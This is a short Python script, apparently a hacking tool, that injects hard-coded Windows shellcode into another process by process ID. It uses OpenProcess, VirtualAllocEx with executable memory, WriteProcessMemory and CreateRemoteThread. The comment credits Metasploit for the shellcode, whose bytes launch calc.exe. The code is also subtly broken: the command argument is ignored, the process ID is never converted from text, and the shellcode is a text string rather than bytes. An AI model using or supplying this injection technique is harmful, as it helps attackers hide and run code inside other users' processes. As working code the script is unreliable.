from ctypes import *
import sys

def getPID(pid):
	return pid


def generateShellcode(cmdString):
	# Windows Exec Shellcode Sourced from the Metasploit Framework 
	# http://www.rapid7.com/db/modules/payload/windows/exec

	shellcode = "\x89\xe5\x83\xec\x20\x31\xdb\x64\x8b\x5b\x30\x8b\x5b\x0c\x8b\x5b"\
"\x1c\x8b\x1b\x8b\x1b\x8b\x43\x08\x89\x45\xfc\x8b\x58\x3c\x01\xc3"\
"\x8b\x5b\x78\x01\xc3\x8b\x7b\x20\x01\xc7\x89\x7d\xf8\x8b\x4b\x24"\
"\x01\xc1\x89\x4d\xf4\x8b\x53\x1c\x01\xc2\x89\x55\xf0\x8b\x53\x14"\
"\x89\x55\xec\xeb\x32\x31\xc0\x8b\x55\xec\x8b\x7d\xf8\x8b\x75\x18"\
"\x31\xc9\xfc\x8b\x3c\x87\x03\x7d\xfc\x66\x83\xc1\x08\xf3\xa6\x74"\
"\x05\x40\x39\xd0\x72\xe4\x8b\x4d\xf4\x8b\x55\xf0\x66\x8b\x04\x41"\
"\x8b\x04\x82\x03\x45\xfc\xc3\xba\x78\x78\x65\x63\xc1\xea\x08\x52"\
"\x68\x57\x69\x6e\x45\x89\x65\x18\xe8\xb8\xff\xff\xff\x31\xc9\x51"\
"\x68\x2e\x65\x78\x65\x68\x63\x61\x6c\x63\x89\xe3\x41\x51\x53\xff"\
"\xd0\x31\xc9\xb9\x01\x65\x73\x73\xc1\xe9\x08\x51\x68\x50\x72\x6f"\
"\x63\x68\x45\x78\x69\x74\x89\x65\x18\xe8\x87\xff\xff\xff\x31\xd2"\
"\x52\xff\xd0"
	return shellcode
	
# Injects shellcode: Takes in shellcode as string, converts to bytearray
def injectShellcode(pid, shellcode):   	
	process_handle = windll.kernel32.OpenProcess(0x1F0FFF, False, pid)	#get handle of target process
	memory_allocation_variable = windll.kernel32.VirtualAllocEx(process_handle, None, len(shellcode), 0x1000, 0x40) #allocate memory for shellcode in target process
	windll.kernel32.WriteProcessMemory(process_handle, memory_allocation_variable, shellcode, len(shellcode), None) #write shellcode into allocated memory
	if not windll.kernel32.CreateRemoteThread(process_handle, None, 0, memory_allocation_variable, None, 0, None): #start thread with injected code
		return False
	return True

def usage():
    print ("python " + sys.argv[0] + " <pidprocess to inject> <commands to inject>")

if len(sys.argv) < 3:
    usage()
    sys.exit(0)

print ("* Search process " + sys.argv[1]) 
target_pid = getPID(sys.argv[1])
if target_pid == 0:
	print ("\tProcess " + sys.argv[1] + " non accessible...exiting!")
	sys.exit(0)

print ("* Process found, start injection...")
shellcode = generateShellcode(sys.argv[2])
if injectShellcode(target_pid, shellcode):
	print ("\tThread started!")
else:
	print ("\tInjection failed")